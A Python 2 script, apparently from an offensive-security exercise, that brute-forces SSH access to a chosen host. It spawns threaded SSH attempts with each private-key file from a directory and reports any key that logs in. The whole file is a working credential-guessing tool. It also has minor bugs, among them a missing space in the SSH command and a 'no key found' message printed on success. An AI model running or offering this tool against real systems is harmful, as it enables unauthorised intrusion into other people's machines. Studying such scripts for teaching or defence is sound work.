import pexpect
import optparse
import os
from threading import *

maxConn=5
stop=False
fails=0
connection_lock=BoundedSemaphore(value=maxConn)


def connect(host,user,fullPath,release):
    global stop
    global fails

    try:
        permDenied='Permission Denied'
        ssh_newkey='Are you sure you want to continue'
        connClosed='Connection closed by remote host'
        opt='-o PasswordAuthentication=no'
        connStr='ssh '+user+'@'+host+' -i '+fullPath+opt
        child=pexpect.spawn(connStr)
        ret=child.expect([pexpect.TIMEOUT,permDenied,ssh_newkey,connClosed,'#','$'])
        if ret==2:
            print('[+] Adding host to ~/.ssh/known_hosts')
            child.sendline('yes')
            connect(host,user,fullPath,False)
        elif ret==3:
            print('[-] Connection closed by Remote host')
            fails+=1
        elif ret>3:
            print('[+] success '+fullPath)
            stop=True
    except Exception,e:
        print(e)
        print('error')
    finally:
        if release:
            connection_lock.release()


def main():
    parser=optparse.OptionParser("Usage : -H <target host> -u <user> -d <directory>")
    parser.add_option("-H",dest='tgtHost',type='string',help='Specify the target host')
    parser.add_option('-u',dest='user',type='string',help='Specify the target username')
    parser.add_option('-d',dest='passDir',type='string',help='Specify the password directory')
    (options,args)=parser.parse_args()
    host=options.tgtHost
    user=options.user
    passDir=options.passDir
    if host==None or passDir==None or user==None:
        print (parser.usage)
        exit(0)
    for filename in os.listdir(passDir):
        if stop:
            print('[*] Exiting no key found')
            exit(0)
        if fails>5:
            print('[!] Exiting Too many connections closed by host')
            print('[!] Adjust the number of threads')
        connection_lock.acquire()
        fullPath=os.path.join(passDir,filename)
        print('[ * ] Testing keyfile '+str(fullPath))
        t=Thread(target=connect,args=(host,user,fullPath,True))
        child=t.start()

if __name__=="__main__":
    main()
    